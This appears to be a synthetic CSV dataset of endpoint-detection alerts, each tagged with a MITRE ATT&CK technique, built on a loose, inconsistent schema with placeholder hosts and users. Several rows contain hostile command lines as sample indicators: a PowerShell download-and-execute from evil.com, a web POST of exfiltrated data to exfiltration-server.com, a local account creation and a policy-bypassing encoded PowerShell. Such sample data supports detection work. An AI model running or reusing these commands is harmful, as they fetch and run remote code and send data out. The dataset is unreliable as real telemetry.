event_id,event_type,event_timestamp,event_category,event_description,severity,event_time,category,mitre_technique,host,event_severity,affected_hosts,event_details,action,detect_description,detect_id,technique,src_ip,src_port,protocol,user_name,process_name,technique_name,affected_host,affected_process,affected_file_path,command_line,parent_process,parent_process_command_line,detection_method,recommended_actions,event_version,event_data,event_name,endpoint,data,rule_name,recommendation,event_subtype,container_name,image_name,image_digest,registry,command,source_ip,destination_ip,process_path,username,detection,actor,host_info,event_url,event_hash,detected_by,details,device,source,target,attack_name,tactic,ip_address,process_id,metadata,alert_type,timestamp,detection_info,sensor_id,hostname,ip,user,domain,process_command_line,process_pid,parent_process_name,parent_process_pid,c2,files,detection_source,web_server_url,web_server_method,type,process,network,event,trigger,remediation,artifact_hiding,process_injection,security_control_disablement,file_deletion,name,affected_entities,dst_ip,kill_chain_phases,file,process_execution,registry_modification,cloud_infrastructure_modification,subtype,detection_details,customer_id,event_info,product,mitre,attack_details,description,destination_port,parent_process_id,email_sender,email_recipient,email_subject,email_urls,email_attachments,Severity,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,Recommendation,Title,Tactic,Technique,Affected_Image_Path,Injected_Process_Name,Parent_Process_Name,Injection_Technique,indicators,actions,additional_info,file_info,network_info,Timestamp,Description,Loader_Process_Name,Loader_Technique,event_Source,tactics,recommendations,ip_addresses,mac_addresses,operating_system,agent_version,group_name,destination,threat_severity,threat_category,threat_name,ioc,tags,detect_name,rule_description,triggered_rule,alert_rule_name,alert_rule_id,alert_state,alert_time,src,process_tree,remediation_steps,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,EventID,Category,AffectedHostInfo,DetectionDetails,endpoint_id,web_service_name,web_service_path,ioc_type,ioc_value,process_details,host_details,DetectionId,Details,event_action,event_source,status,application,threat,source_port,file_write,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFilePath,AffectedFileSize,technique_id,event_creator,subtechnique_id,subtechnique,remote_server,mitre_attack_id,cloud_account,org_id,event_event_name,data_source,device_name,file_name,file_size,src_path,dst_path,host_name,file_path,md5_hash,sha256_hash,alert_data,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,file_permission_modification,Domain_Controller_IP,Domain_Controller_Name
12345,threat_detection,1646749633000,Access Token Manipulation Detected,Access Token Manipulation has been detected on endpoint.,High,2023-03-10T12:00:00Z,Endpoint Detection and Response,Access Token Manipulation (T1134),"{'hostname': 'endpoint1', 'ip': '192.168.1.100', 'os': 'Windows 10 Pro', 'user': 'JohnDoe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-24680,DetectionSummaryEvent,1646749633000,Account Manipulation,User account 'jdoe' was added to the local 'Administrators' group on host DC-1,,,,,,High,"[{'host_name': 'DC-1', 'ip_address': '192.168.1.10'}]","{'username': 'admin', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.11', 'affected_user': 'jdoe', 'affected_group': 'Administrators', 'modification_type': 'Addition'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-67890,Application Layer Protocol,1646749633000,Application Layer Protocol,,high,,,,,,,,network-connect,A network connection was made using an application layer protocol that is commonly associated with malware or other suspicious activity.,123456,Application Layer Protocol,192.168.1.100,1234,HTTPS,user1,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
98765,BITS Job Execution Detected,2023-03-10T10:30:00Z,BITS job execution,BITS job execution was detected on the endpoint.,high,,,,,,,,,,,,,,,,,BITS Jobs,hostname,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job /download /priority normal http://example.com/file.txt C:\file.txt,explorer.exe,C:\Windows\explorer.exe,File system monitoring and behavioral analysis,"['Terminate the process and remove any associated artifacts.', 'Investigate the source and destination of the BITS job.', 'Check for other suspicious activity on the endpoint and the network.', 'Update endpoint security software and monitor for any further activity.']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,Threat Detection,1646749655000,Suspicious data manipulation,Suspicious data manipulation activity or Data Destruction detected on endpoint,,,,,,high,,,,,,,,,,,,,,,,,,,,,1.0,"{'hostname': 'example-hostname', 'user_name': 'example-user', 'timestamp_utc': '2022-03-07T16:57:35.000Z', 'attack_name': 'Data Destruction', 'threat_score': 100, 'threat_indicators': [{'indicator_type': 'file_path', 'indicator_value': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Path of the file that was destroyed'}, {'indicator_type': 'file_hash', 'indicator_value': '1234567890ABCDEF1234567890ABCDEF12345678', 'indicator_description': 'SHA-1 hash of the file that was destroyed'}, {'indicator_type': 'command_line', 'indicator_value': 'cmd /c del C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Command line used for data destruction'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
lodfldpw,threat detection,2023-03-08T09:00:00Z,Data Encoding Detected,Data encoding has been detected on a system,high,,,,,,,"{'process_name': 'notepad.exe', 'process_path': 'C:\\Windows\\system32\\notepad.exe', 'command_line': 'notepad.exe C:\\Users\\User1\\Desktop\\encoded.txt', 'parent_process_name': 'explorer.exe', 'parent_process_path': 'C:\\Windows\\explorer.exe', 'encoding_type': 'Base64', 'encoded_data': 'SGVsbG8gV29ybGQh'}",,,,,,,,,,,,,,,,,,,,,Data Encoding Detected,"{'hostname': 'Endpoint1', 'ip_address': '192.168.1.10', 'mac_address': '00-0C-29-56-A7-34', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646873400000,Data Manipulation,Data Manipulation detected on endpoint,,,,,,medium,,,,,,,,,,,,,,,,,,,,,1.0,"{'hostname': 'example-hostname', 'user_name': '', 'timestamp_utc': '2022-03-09T09:30:00.000Z', 'attack_name': 'Data Manipulation', 'threat_score': 70, 'threat_indicators': [{'indicator_type': 'process_name', 'indicator_value': 'C:\\Program Files\\example-app\\example-app.exe', 'indicator_description': 'Process responsible for the suspicious data manipulation activity'}, {'indicator_type': 'file_path', 'indicator_value': 'C:\\Windows\\Temp\\example-file.txt', 'indicator_description': 'File modified by the suspicious data manipulation activity'}], 'sensor_id': '1234', 'sensor_version': '5.38.0.0', 'product_name': 'Falcon Agent', 'product_version': '5.38.0.0', 'event_source': 'EDR', 'event_source_id': '5678', 'event_type_id': '200001', 'event_type': 'DetectionSummaryEvent'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
02030tr0f,detect,2022-03-15T10:30:00Z,defacement detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,"[{'severity': 'high', 'event_id': '123456', 'detect_description': 'Potential website defacement detected', 'detect_name': 'Website Defacement Detected', 'detect_id': 'T1491', 'hostname': 'example-device', 'os': 'Windows', 'os_version': '10.0.19042', 'process_name': 'iexplore.exe', 'command_line': 'iexplore.exe https://example.com/', 'process_id': '1234', 'parent_process_name': 'explorer.exe', 'parent_command_line': 'explorer.exe', 'event_timestamp': '2022-03-15T10:30:00Z', 'file_path': 'C:\\inetpub\\wwwroot\\index.html', 'attack_vector': 'Web'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
2040fjh2,alert,2023-03-10T15:00:00.000Z,Deobfuscate/Decode Files or Information,Deobfuscation or decoding activity has been detected on the endpoint.,Medium,,,,"{'hostname': 'example-hostname', 'ip_address': '192.0.2.1', 'mac_address': '00:11:22:33:44:55', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,2.0,,,,,Deobfuscate/Decode Files or Information,Investigate the endpoint for any signs of malicious activity.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
1234567890,Detect,2022-04-01T13:15:30Z,suspicous container,Suspicious container deployment detected,High,,,,,,,,,,,,,,,,kubectl.exe,,,,,,,,,,,,,,,,,ContainerDeploy,malicious-container,malicious-image,sha256:abcdef123456,malicious-registry.com,kubectl run malicious-container --image=malicious-image,192.168.1.100,10.10.10.10,C:\Windows\System32\kubectl.exe,admin,"{'detection_id': 'Detection-123', 'detection_time': '2022-04-01T13:18:30Z', 'detection_category': 'Exploit', 'detection_name': 'Container Deployment', 'detection_description': 'Detection of a container deployment using an exploit'}","{'type': 'Unknown', 'name': 'Unknown'}","{'hostname': 'computer-123', 'os_version': 'Windows 10 Pro 21H1', 'os_type': 'Windows', 'ip_addresses': ['192.168.1.100', 'fe80::d5a3:9c9f:2189:e591'], 'mac_addresses': ['00:0c:29:aa:bb:cc'], 'domain': 'mycompany.local'}",https://falcon.crowdstrike.com/sensors/entities/incidents/incident-details?incidentId=1234567890,abc123def456ghi789jkl012mno345pqr678stu9v,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
9492hbd092,DetectionSummaryEvent,,direct volume access,An attempt to access a volume directly has been detected.,High,2023-03-10T12:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint Detection and Response,"{'process': {'name': 'cmd.exe', 'pid': '123', 'command_line': 'cmd.exe /c net user test test123 /add'}, 'volume': {'name': 'C:', 'access_type': 'Direct', 'operation': 'Write'}}","{'id': 'Endpoint1', 'hostname': 'MyComputer', 'ip_address': '192.168.1.100', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
09430t0dj,threat detection,2023-03-09T12:00:00.000000Z,Dynamic resolution,Dynamic Resolution detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'type': 'endpoint', 'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.101'}","{'type': 'process', 'process_name': 'chrome.exe', 'process_command_line': 'chrome.exe www.maliciousdomain.com', 'process_id': '1234'}",Dynamic Resolution,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456,alert,,encrypted channel,Encrypted Channel detected,,2023-03-09T12:00:00.000000Z,,,,medium,,,,,,,,,,,powershell.exe,,,,,powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA= ,,,,,,,,,,Encrypted Channel,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.101,1234,"{'customerID': '12345', 'machineName': 'DESKTOP-ABC123', 'domain': 'contoso.com'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,,,,2022-03-08T14:32:47Z,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,"{'rule_name': 'MITRE ATT&CK T1499 Endpoint Denial of Service', 'rule_description': 'Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.', 'rule_severity': 'high', 'rule_id': 'MITRE_ID_T1499', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'delivery'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'exploitation'}], 'event_type': 'endpoint-dos', 'event_description': 'Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.', 'event_category': 'Denial of Service', 'source': {'process_name': 'cmd.exe', 'command_line': 'cmd.exe /c ping -n 10000 127.0.0.1', 'process_id': '1224'}, 'user_info': {'user_name': 'acme\\jdoe'}, 'host_info': {'hostname': 'WIN10-PC', 'domain': 'acme.local', 'ip_address': '192.168.1.101'}, 'metadata': {'alert_link': 'https://securitycenter.windows.com/alert/1234567890'}, 'recommendation': 'Isolate the affected machine from the network to prevent further damage and investigate the root cause of the attack.'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat_detection,1646749655000,execution gaurdrails,Execution Guardrails Detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'id': 'ABC123', 'hostname': 'Workstation-01', 'ip': '192.168.1.100', 'os': 'Windows 10', 'username': 'John.Doe', 'process_name': 'cmd.exe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,suspicious_activity,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,DetectionSummaryEvent,,data exfiltration,Exfiltration Over Alternative Protocol,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'example-hostname', 'domain': 'example-domain', 'os': 'Windows 10'}",,,,,,,,,,,,,,2023-03-08T12:00:00.000000Z,"{'detection_id': '12345678-1234-1234-1234-123456789012', 'detection_name': 'Exfiltration Detection', 'detection_description': 'Detects exfiltration over alternative protocol', 'detection_time': '2023-03-08T12:00:00.000000Z', 'rule_name': 'Exfiltration Detection Rule', 'rule_id': '12345678-1234-1234-1234-123456789012', 'ioc_info': {'ioc_type': 'protocol', 'ioc_value': 'DNS', 'ioc_description': 'Alternative exfiltration protocol'}, 'command_line': 'nslookup example.com 8.8.8.8'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646749655000,data exfiltration,Exfiltration Over C2 Channel Detected,high,,,,,,,,detect,,,,,,,,powershell.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABC123,DESKTOP-ABC123,192.168.1.100,JohnDoe,DOMAIN,powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'),1234.0,explorer.exe,5678.0,"{'destination': 'evil.com', 'protocol': 'HTTP'}","[{'name': 'SensitiveData.txt', 'type': 'exfiltrated'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646749655000,data exfiltration,Exfiltration Over Physical Medium Detected,high,,,,,,,,,,,,,,"{'name': 'USB', 'direction': 'outbound'}",,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABC123,DESKTOP-ABC123,192.168.1.100,JohnDoe,DOMAIN,explorer.exe copy SensitiveData.txt E:\,1234.0,,,,"[{'name': 'SensitiveData.txt', 'type': 'exfiltrated'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345678-1234-1234-1234-123456789012,threat detection,2023-03-08T14:30:00Z,exfiltration over web service,Exfiltration Over Web Service Detected,,,,,,high,,,,,,,,,,,explorer.exe,,,,,powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678,,,,,,,,,,,,,,,,Microsoft Defender for Endpoint,http://exfiltration-server.com,POST,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,Attempted Attack,An attempt was made to exploit a public-facing application on the host.,,,,,"{'hostname': 'host-123', 'ip_address': '192.168.0.1', 'mac_address': '00:11:22:33:44:55'}",,,,Exploit Public-Facing Application,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T10:30:00.000Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,2022-03-17T14:30:00Z,Exploitation for Client Execution,Possible Exploitation for Client Execution,high,,,,,,,"{'technique': 'Exploitation for Client Execution', 'affected_process': 'explorer.exe', 'process_id': '1234'}",detect,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'module': 'endpoint', 'product': 'falcon', 'sensor_id': '1234567890abcdef', 'hostname': 'WIN-12345', 'ip_address': '192.168.1.100', 'user': 'DOMAIN\\user'}",,,,,,,,,,,,,,,,,,,,,,,,anomaly,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,evade detection,1646749655000,exploit for defensive evasion,An attempt to exploit a vulnerability in order to evade detection or maintain persistence.,high,,,,"{'hostname': 'server01', 'ip_address': '192.168.1.100'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'ioc': [{'type': 'File Hash', 'value': 'f1a4f16db921e4c4efc6b51a6b10a6f7'}, {'type': 'URL', 'value': 'https://malicious-site.com/exploit'}], 'reason': 'Exploit detected'}",,,,,,,,,,,,,,,,,,,,,{'username': 'admin'},,,,,,,,,,,,"{'process_name': 'cmd.exe', 'process_id': '1234', 'file_path': 'C:\\Windows\\system32\\cmd.exe', 'command_line': 'cmd.exe /c echo hello world'}","{'protocol': 'TCP', 'port': '4444', 'remote_address': '192.168.1.100'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,external remote services,A connection to an external remote service has been detected.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,Potential External Remote Services Connection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'type': 'network', 'subtype': 'socket', 'event_timestamp': '2022-04-01T14:30:00Z', 'src_ip': '', 'dst_ip': '10.0.0.2', 'src_port': '', 'dst_port': '8080', 'protocol': 'tcp', 'http': {'full_uri': 'http://10.0.0.2:8080', 'user_agent': '', 'referer': '', 'request_method': '', 'response_status_code': ''}, 'remote_service': {'name': 'Unknown', 'type': 'Unknown', 'ports': ['8080', '8443'], 'ipv4': '10.0.0.2', 'ipv6': '', 'url': 'http://10.0.0.2:8080', 'certificate': '', 'encryption': 'Unknown', 'authentication': 'Unknown', 'version': 'Unknown', 'product': 'Unknown', 'organization': 'Unknown'}, 'process': {'cmdline': 'explorer.exe /root,C:\\Windows\\system32', 'path': 'C:\\Windows\\explorer.exe', 'pid': 1234, 'name': 'explorer.exe'}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456,alert,,fallback channels,Fallback communication channel detected,,2023-03-09T12:00:00.000000Z,,,,medium,,,,,,,,,,,powershell.exe,,,,,powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA=,,,,,,,,,,Fallback Channels,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,"{'protocol': 'http', 'dst_ip': '192.168.1.100', 'dst_port': '80'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,Firmware Corruption,,firmware corruption,Crowdstrike Falcon detected firmware corruption on endpoint.,High,2022-03-06T09:18:56Z,,,"{'hostname': 'DESKTOP-ABC123', 'machine_id': '12345'}",,,,,,,,,,,,,,,,,,,,EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'cmd.exe', 'command_line': 'cmd.exe /c rundll32.exe bios.dll,CorruptFirmware'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,hardware additions,This alert is triggered when new hardware is detected on the endpoint.,HIGH,,,,,,,,,Hardware addition detected on endpoint,,Hardware Additions,,,,,,,,,,,,,,,,,Possible Hardware Additions Detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'tags': ['T1200', 'Hardware Additions', 'Endpoint Detection']}",,,,,,,,,,,,,,,,,,,,,,"{'event': {'type': 'HardwareAddition', 'detection_id': '12345', 'device_type': 'Physical'}}","{'action': ['Investigate the hardware addition to determine if it is legitimate or unauthorized', 'If the hardware is unauthorized, remove it from the endpoint immediately', 'Consider implementing endpoint security controls to prevent unauthorized hardware additions']}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
7294060-3,threat detection,2023-03-10T14:00:00Z,artifact_hiding,"An attempt to hide artifacts such as files, processes or registry keys from detection or analysis.",high,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Attempt to hide malware file'},,,,,,,,,,,,,,,,,,,,,{'username': 'admin'},,,,,,,,,,,,"{'process_name': 'explorer.exe', 'process_id': '5678'}",,,,,"{'artifact_type': 'File', 'artifact_path': 'C:\\Windows\\system32\\cmd.exe', 'artifact_name': 'malware.exe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
93858y60,detect,2023-03-10T15:00:00Z,process_injection,An attempt to hijack the execution flow of a legitimate process.,high,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized process injection'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,"{'process_name': 'svchost.exe', 'injected_process_name': 'malware.exe', 'injection_technique': 'Reflective DLL Injection'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040540f,detect,2023-03-10T16:00:00Z,security_control_disablement,An attempt to disable or bypass security controls to avoid detection.,high,,,,{'hostname': 'laptop01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized security control disablement'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,{'control_name': 'CrowdStrike Falcon'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
